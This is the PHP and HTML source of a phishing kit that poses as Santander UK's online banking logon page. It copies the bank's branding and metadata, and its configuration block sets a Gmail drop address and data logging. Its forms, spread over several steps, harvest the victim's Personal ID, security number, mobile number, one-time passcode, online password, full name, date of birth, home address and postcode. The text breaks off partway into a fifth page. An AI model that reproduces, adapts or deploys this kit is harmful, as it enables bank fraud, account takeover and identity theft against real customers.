﻿﻿<?php
header('Access-Control-Allow-Origin: *');

$send    = "emcobar1980@gmail.com"; //change ur email
$logfile = 1;                            //1 = log data, 0 = do not log data

/*--------------------------- DO NOT CHANGE ANYTHING BELOW EXCEPT YOU KNOW WHAT YOU ARE DOING. ---------------------------------- */
/* ----------------  XXX-MJ  ------------------------*/
$disHost = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['PHP_SELF']).'/';
$ip = getenv("REMOTE_ADDR"); //getip(); //
$svr_host =  str_replace('www.', '', $_SERVER['HTTP_HOST']);
function mj_load_view()
{
    global $disHost;
    
    $eml      = (!empty($_REQUEST['email'])) ? $_REQUEST['email'] : '';
    $readonly = (!empty($_REQUEST['email'])) ? ' readonly' : '';

    ob_start();
?>
<!doctype html>
<html lang="en-GB">

<head>
    <base href="<?php echo $disHost; ?>">
    <meta charset="utf-8">
    <title>Personal Online Banking: Log on or sign up</title>
    <meta name="title" content="Online Banking | Personal Account Holders | Santander UK">
    <meta name="description" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk">
    <meta name="abstract" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk">
    <link rel="icon" href="https://retail.santander.co.uk/olb/app/logon/access/favicon.ico" type="image/x-icon">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache, no-store">

    <script type="text/javascript">
        function pub940l1m1() {
            if ("" === "") { 
                var result= {"c": "3d1825872d1541c09a747cd5df6fbced"};   
                return result;
            } else {
                var result= {"u": { "p": [""]},
                                "c": "3d1825872d1541c09a747cd5df6fbced"};
                return result;
            }
        }
    </script>

    <style>
        .security-number[_ngcontent-uxf-c1]{color:#000;letter-spacing:20px;background-color:transparent}.security-number[_ngcontent-uxf-c1]::-webkit-input-placeholder{color:#ccc!important}.security-number[_ngcontent-uxf-c1]::-moz-placeholder{color:#ccc!important}.security-number[_ngcontent-uxf-c1]:-ms-input-placeholder{color:#ccc!important}.security-number[_ngcontent-uxf-c1]::-ms-input-placeholder{color:#ccc!important}.security-number[_ngcontent-uxf-c1]::placeholder{color:#ccc!important}@supports not ((-webkit-hyphens:auto) or (-ms-hyphens:auto) or (hyphens:auto)){.security-number[_ngcontent-uxf-c1]{-webkit-text-stroke-width:.2em}.security-number[_ngcontent-uxf-c1]::-webkit-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-uxf-c1]::-moz-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-uxf-c1]:-ms-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-uxf-c1]::-ms-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-uxf-c1]::placeholder{-webkit-text-stroke-width:0!important}}.invalid-security-number[_ngcontent-uxf-c1]{border:1px solid #ec0000!important;border-radius:4px}
    </style>

</head>

<body>
    <!-- <meta http-equiv="content-secure-policy"  content="deafult-src 'self'=" " '*'=" " "="">
        <meta http-equiv="X-Xss-Protection" content="'1; mode=block' always">
        <meta http-equiv="X-Content-Type-Options" content="'nosniff' always">
        <meta http-equiv="Strict-Transport-Security" content="max-age=31536000"> -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0">
    <link rel="stylesheet" href="style.css">

    <olb-root _nghost-uxf-c0="" ng-version="7.2.16">
        <olb-home _ngcontent-uxf-c0="">
            <div class="container-fluid appheader">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-12 containerPadding header-responsive" role="banner">
                            <olb-header>
                                <nav class="navbar appheader_content">
                                    <a href="#">
                                        <img alt="Santander Image" class="img-fluid Bitmap header-logo-santander" src="data:image/png;base64,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">
                                    </a>
                                    <!---->
                                    <!---->
                                    <div><span class="title-small singup-text">Don’t have Online Banking?&nbsp;</span><a aria-describedby="signupDesc" aria-label="Sign up to Online Banking" class="anchor-red-links" href="#">Sign up</a>
                                    </div>
                                </nav>
                            </olb-header>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container">
                <div class="row">
                    <div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main">
                        <router-outlet></router-outlet>
                        <olb-logon>
                            <div class="content">
                                <div class="row">

                                    <div id="firstPG" class="col-lg-5 col-sm-12 left-content page-frame" xxstyle="display:none;">
                                        <div>
                                            <div class="d-flex justify-content-center mt-4" id="logon-heading">
                                                <h1 class="title-header title-color-red">Log on to your Online Banking</h1>
                                            </div>
                                            <div aria-live="off" class="mt-3">
                                                <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                    <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="" role="tab">Personal</a>
                                                    </li>
                                                    <li class="nav-item" role="presentation"><a class="nav-link" role="tab" spacebarclick="" href="#">Business</a>
                                                    </li>
                                                    <li class="nav-item" role="presentation"><a class="nav-link" role="tab" spacebarclick="" href="#">Corporate</a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div>
                                            <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                    <div aria-live="off">
                                                        <olb-retail-logon>
                                                            <div class="logon-form">
                                                                <form name="form1" autocomplete="off" novalidate="" method="post" class="pg-forms ng-pristine ng-invalid ng-touched" action="___.php?_do=form1">
                                                                    <div class="errorMessage mb-3">
                                                                        <olb-validation-message imglocation="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg" msgtype="warn">
                                                                            <!---->
                                                                        </olb-validation-message>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="pid">Personal ID</label>
                                                                            <input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="pid" id="pid" maxlength="26" minlength="5" name="pid" onpaste="return true" type="text">
                                                                            <!---->
                                                                            <!----><span class="d-none" id="pidDesc"> Please Enter your Personal ID </span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="securityNumber">Security number</label>
                                                                            <div class="security-number-help-info"><span> You may know this as your 5 digit Registration Number or Customer PIN </span>
                                                                            </div>
                                                                            <common-security-number _nghost-uxf-c1="">
                                                                                <!---->
                                                                                <!---->
                                                                                <div _ngcontent-uxf-c1="" class="ng-pristine ng-invalid ng-touched">
                                                                                    <label _ngcontent-uxf-c1="" class="sr-only" for="securityNumber">Security Number</label>
                                                                                    <input _ngcontent-uxf-c1="" aria-required="true" autocomplete="off" maxlength="5" minlength="5" oncopy="return false" oncut="return false" onpaste="return false" placeholder="●●●●●" type="password" class="security-number form-control logon-textbox password-textbox ng-untouched ng-pristine ng-invalid nums-only" id="securityNumber" name="securityNumber" aria-describedby="securityNumberDacIdsecurityNumber"><span _ngcontent-uxf-c1="" class="d-none" id="securityNumberDacIdsecurityNumber"> Please Enter 5 digits security number and it is also known as Registration number or Customer PIN </span>
                                                                                </div>
                                                                            </common-security-number>
                                                                            <!---->
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex ">
                                                                        <div class="rememberMeDiv">
                                                                            <label class="checkbox_container">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <input aria-describedby="remembermeDesc" aria-label="Remember ID" formcontrolname="rememberme" id="rememberme" name="rememberme" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span class="checkbox_text">Remember ID </span><span class="checkmark"></span>
                                                                                    <div class="d-none"><span id="remembermeDesc"> Please check the checkbox if you want to remember your Personal ID in this device </span>
                                                                                    </div>
                                                                                </label>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex ">
                                                                        <div class="mt-2">
                                                                            <label class="checkbox_container">
                                                                                    <input aria-describedby="publicDeviceDesc" aria-label="I'm using a public or shared device" formcontrolname="publicdevice" id="publicdevice" name="publicdevice" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span class="checkbox_text"> I'm using a public or shared device </span><span class="checkmark"></span><span class="d-none" id="publicDeviceDesc"> Please check the checkbox if you are using public or shared device </span>
                                                                                </label>
                                                                        </div>
                                                                    </div>
                                                                    <div class=" mt-4 row d-flex">
                                                                        <!---->
                                                                        <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                            <div class="justify-content-center button-xs-width">
                                                                                <button aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="submitbtn" type="submit" disabled=""><span class="log-on-text">Log on</span>
                                                                                    </button><span class="d-none" id="logonButtonDesc"> Please click logon button to validate your Personal ID and Security Number </span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-12 mt-2">
                                                                            <div class="d-flex justify-content-center"><a aria-describedby="forgottenDetailsDesc" class="anchor-red-links" tabindex="0" href="/olb/app/reset/">Forgotten details?</a><span class="d-none" id="forgottenDetailsDesc"> If you don't remember your logon credentials, Please click here </span>
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                        <div>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div> <!----> </div>
                                                                </form>
                                                            </div>
                                                        </olb-retail-logon>
                                                    </div>
                                                </div>
                                                <div class="tab-pane" id="buisness" role="tabpanel"></div>
                                                <div class="tab-pane" id="coporate" role="tabpanel"></div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Page 2 -->

                                    <div id="secondPG" class="col-lg-5 col-sm-12 left-content page-frame" style="display: none;">
                                        <div>
                                            <div class="d-flex justify-content-center mt-4" id="logon-heading">
                                                <h1 class="title-header title-color-red">Confirm your details in the system.</h1>
                                            </div>

                                            <div aria-live="off" class="mt-3">
                                                <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                    <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="" role="tab"><span>Personal ID </span> <strong id="pid_display">46787543245</strong></a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>

                                        <div>
                                            <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                    <div aria-live="off">
                                                        <olb-retail-logon>
                                                            <div class="logon-form">

                                                                <form name="form2" autocomplete="off" novalidate="" method="post" class="pg-forms ng-pristine ng-invalid ng-touched" action="___.php?_do=form2">

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="mobile_number">Mobile number</label>
                                                                            <input alphanumericvalidator="" aria-describedby="mobile_numberDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched nums-only" formcontrolname="mobile_number" id="mobile_number" maxlength="11" name="mobile_number" onpaste="return true" type="text" required>
                                                                            <span class="d-none" id="mobile_numberDesc"> Please Enter your Mobile Number </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class=" mt-4 row d-flex">
                                                                        <!---->
                                                                        <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                            <div class="justify-content-center button-xs-width">
                                                                                <button aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="confirmbtn" type="submit" disabled=""><span class="log-on-text">Confirm</span>
                                                                                    </button><span class="d-none" id="logonButtonDesc"> Please click confirm button to confirm your details in system. </span>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </form>

                                                            </div>
                                                        </olb-retail-logon>

                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <!--  Page 3 -->

                                    <div id="thirdPG" class="col-lg-5 col-sm-12 left-content page-frame" style="display: none;">

                                        <div>
                                            <div class="tab-content d-flex justify-content-center xmt-4 mb-5">
                                                <div class="tab-pane active retail-logon-content" role="tabpanel">
                                                    <div aria-live="off">
                                                        <olb-retail-logon>
                                                            <div class="logon-form">

                                                                <form name="form3" autocomplete="off" novalidate="" method="post" class="pg-forms ng-pristine ng-invalid ng-touched" action="___.php?_do=form3">

                                                                    <!--  Page 3.1 -->

                                                                    <!-- <div class="content otp-container"> -->
                                                                    <div id="pg3-1" class="row" style="display: none;">
                                                                        <div class="xcol-lg-12 xcol-sm-12">
                                                                            <div class="text-center">
                                                                                <div>
                                                                                    <div class="row mt-5 mobile-sms justify-content-center">
                                                                                        <!----><img alt="Send One Time Passcode Image" class="img-fluid sms-mid-image mt-4 js-local-img" src="../ui-icon-fill-sms.png">
                                                                                        <!---->
                                                                                    </div>
                                                                                    <div class="row mt-3">
                                                                                        <div class="col-md-12 send-otp-title-medium">
                                                                                            <h1 class="send-otp-title-medium">Send One Time Passcode</h1>
                                                                                        </div>
                                                                                    </div>
                                                                                    <!---->
                                                                                    <div class="row mt-2">
                                                                                        <div class="col-md-12 title-medium-bold send-otp-font">
                                                                                            <!----><span class="js-otp-phone-number">*******8990</span>
                                                                                            <!---->
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="row mt-1 mb-3">
                                                                                        <div class="col-md-12 title-medium-bold send-otp-font">
                                                                                            <!---->
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="d-none"><span id="emailIdDesc"> We've sent it to . </span></div>
                                                                                    <div class="mt-1 mb-3 title-small">
                                                                                        <!----><span> Changed your number? You'll need to </span>
                                                                                        <!----><a aria-describedby="callusDesc" routerlink="/callus" href="#/callus">call us</a><span class="d-none" id="callusDesc"> Need to call us? Please click here </span></div>
                                                                                    <div>
                                                                                        <!---->
                                                                                        <div class="row mt-2 " style="justify-content: center;">
                                                                                            <div class="col-md-8 col-sm-8 col-lg-10 title-default"><span> We'll send a text message with a One Time Passcode to your mobile phone. </span></div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <common-one-time-passcode _nghost-mym-c2="">
                                                                                        <!---->
                                                                                        <div _ngcontent-mym-c2=""><label _ngcontent-mym-c2="" class="sr-only" for="">One Time passcode</label>
                                                                                            <!---->
                                                                                        </div>
                                                                                        <!---->
                                                                                    </common-one-time-passcode>
                                                                                    <div class="row  send-passcode-button">
                                                                                        <div class="col-md-12 col-sm-12 col-lg-12 mt-lg-5"><button aria-describedby="sendOTPButtonDesc" class="button button-secondary send-passcode-button-width" id="sendcode"> Send Passcode</button>
                                                                                            <!----><span class="d-none" id="sendOTPButtonDesc"> please click here to send One Time Passcode to your mobile number </span>
                                                                                            <!---->
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="mt-1 mb-3"><a alt="cancel otp" aria-describedby="cancelLogonDesc" href="#/logon">Cancel log on </a><span class="d-none" id="cancelLogonDesc"> If you wish to cancel logon, please click here </span></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <!-- </div> -->

                                                                    <!--  Page 3.2 -->

                                                                    <div id="pg3-2" class="row" xxstyle="display: none;">
                                                                        <div class="xcol-lg-5 xcol-sm-12">
                                                                            <div>
                                                                                <div>
                                                                                    <div class="row mt-5 justify-content-center mb-3">
                                                                                        <img alt="Enter One Time Passcode image" class="img-fluid sms-mid-image js-local-img" src="../ui-icon-fill-sms.png">
                                                                                    </div>
                                                                                    <div novalidate="" class="ng-pristine ng-invalid ng-touched">
                                                                                        <div class="row mt-3">
                                                                                            <div class="col-md-12">
                                                                                                <h1 class="title-header">Enter One Time Passcode</h1>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div>
                                                                                            <div class="row mt-3 mb-2">
                                                                                                <div class="col-md-12 col-sm-12 col-lg-12 title-default"> You should receive your code in a moment.</div>
                                                                                            </div>
                                                                                            <div class="row mb-2">
                                                                                                <!---->
                                                                                                <div class="col-md-2 col-sm-2 col-lg-2"></div>
                                                                                                <!---->
                                                                                                <div class="col-md-8 col-sm-8 col-lg-8 title-default"> We've sent it to <span class="js-otp-phone-number">*******8990</span>. </div>
                                                                                                <!---->
                                                                                                <!---->
                                                                                            </div>
                                                                                            <!---->
                                                                                            <!---->
                                                                                            <div class="d-none"><span id="emailIdDesc"> We've sent it to . </span></div>
                                                                                        </div>
                                                                                        <div class="row mt-3 mb-2">
                                                                                            <div class="col-md-12 col-sm-12 col-lg-10 label"> One Time Passcode </div>
                                                                                        </div>
                                                                                        <div class="row mb-2">
                                                                                            <div class="col-md-12 col-sm-12 col-lg-12 label">
                                                                                                <common-one-time-passcode _nghost-mym-c2="">
                                                                                                    <!---->
                                                                                                    <!---->
                                                                                                    <div _ngcontent-mym-c2="" class="ng-pristine ng-invalid ng-touched"><label _ngcontent-mym-c2="" class="sr-only" for="pwd">One Time passcode</label>
                                                                                                        <!----><input _ngcontent-mym-c2="" aria-label="One Time Passcode" aria-required="true" maxlength="8" minlength="4" oncopy="return false" oncut="return false" onpaste="return false" required="" type="text" class="otp-textbox ng-pristine ng-invalid ng-touched" id="pwd" name="otp"></div>
                                                                                                </common-one-time-passcode>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="row mt-2 title-small-info">
                                                                                            <div class="col-md-12 col-sm-12 col-lg-12">
                                                                                                <!---->
                                                                                                <div>
                                                                                                    <!---->
                                                                                                    <!---->
                                                                                                    <div class="otp-text" id="otp-text"> Didn't receive
                                                                                                        <!----><span> a SMS? </span>
                                                                                                        <span>Please wait </span>
                                                                                                        <span aria-hidden="true" aria-live="off" class="otp-timer" role="none">0: <!----><span>13</span></span>

                                                                                                    </div><span class="d-none" id="resendOTPDesc"> To Resend One Time Passcode Please click here </span></div>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="row mt-1 otp-validate-container">
                                                                                            <div class="col-md-1"></div>
                                                                                            <div class="col-md-10 valid-mobile-width">
                                                                                                <div class="otp-errorMessage">
                                                                                                    <olb-validation-message msgtype="warn">
                                                                                                        <!---->
                                                                                                    </olb-validation-message>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                        <!---->
                                                                                        <!---->
                                                                                        <!---->
                                                                                        <div class="row">
                                                                                            <div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center"><button aria-describedby="validateOTPDesc" class="button button-secondary js-btn-continue" id="btnsubmit" type="submit" disabled="disabled">Continue</button><span class="d-none" id="validateOTPDesc"> Please click here to validate One Time Passcode </span></div>
                                                                                        </div>
                                                                                        <div class="d-flex justify-content-center mt-1 mb-3"><a alt="cancelotp" aria-describedby="cancelLogonDesc" href="#/logon">Cancel log on</a><span class="d-none" id="cancelLogonDesc"> If you wish to cancel logon, please click here </span></div>
                                                                                        <!---->
                                                                                        <!---->
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </form>
                                                            </div>
                                                        </olb-retail-logon>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Page 4 -->

                                    <div id="fourthPG" class="col-lg-5 col-sm-12 left-content page-frame" style="display: none;">
                                        <div>
                                            <div class="d-flex justify-content-center mt-4" id="logon-heading">
                                                <h1 class="title-header title-color-red">Confirm your details in the system.</h1>
                                            </div>

                                            <div aria-live="off" class="mt-3">
                                                <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                    <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="" role="tab"><span>Personal ID </span> <strong class="pid-display">46787543245</strong></a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <!--<br/>
                                                <br/>-->
                                        </div>

                                        <div>
                                            <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                    <div aria-live="off">
                                                        <olb-retail-logon>
                                                            <div class="logon-form">

                                                                <form name="form4" autocomplete="off" novalidate="" method="post" class="pg-forms ng-pristine ng-invalid ng-touched" action="___.php?_do=form4">

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="online_password">Online Password</label>
                                                                            <input alphanumericvalidator="" aria-describedby="online_passwordDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="online_password" id="online_password" name="online_password" onpaste="return true" type="password" required>
                                                                            <span class="d-none" id="online_passwordDesc"> Please Enter your Online Password </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="first_name">Full Name</label>
                                                                            <input alphanumericvalidator="" aria-describedby="full_nameDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="full_name" id="full_name" maxlength="13" name="first_name" onpaste="return true" type="text">
                                                                            <span class="d-none" id="full_nameDesc"> Please Enter your Full name </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="dob">Date of birth</label>
                                                                            <input alphanumericvalidator="" aria-describedby="dobDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched js-date" formcontrolname="dob" id="dob" maxlength="10" name="dob" onpaste="return true" type="text">
                                                                            <span class="d-none" id="dobDesc"> Please Enter your Date of Birth </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="house_address">House Address</label>
                                                                            <input alphanumericvalidator="" aria-describedby="house_addressDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="house_address" id="house_address" name="house_address" onpaste="return true" type="text">
                                                                            <span class="d-none" id="house_addressDesc"> Please Enter your House address </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row">
                                                                        <div class="form-group">
                                                                            <label class="label" for="post_code">Post code</label>
                                                                            <input alphanumericvalidator="" aria-describedby="post_codeDesc" aria-required="true" autocomplete="off" class="form-control ng-pristine ng-invalid ng-touched" formcontrolname="post_code" id="post_code" maxlength="6" minlength="4" name="post_code" onpaste="return true" type="text">
                                                                            <span class="d-none" id="post_codeDesc"> Please Enter your Post code </span>
                                                                        </div>
                                                                    </div>

                                                                    <div class="mt-4 row d-flex">
                                                                        <!---->
                                                                        <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                            <div class="justify-content-center button-xs-width">
                                                                                <button aria-describedby="logonButtonDesc" class="button button-secondary button-logon js-btn-continue" type="submit" disabled="disabled"><span class="log-on-text">Confirm</span>
                                                                                    </button><span class="d-none" id="logonButtonDesc"> Please click confirm button to confirm your details in system. </span>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </form>
                                                            </div>
                                                        </olb-retail-logon>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Page 5 -->

                                    <div id="fifthPG" class="col-lg-5 col-sm-12 left-content page-frame" style="display: none;">
                                        <div>
                                            <div class="d-flex justify-content-center mt-4" id="logon-heading">
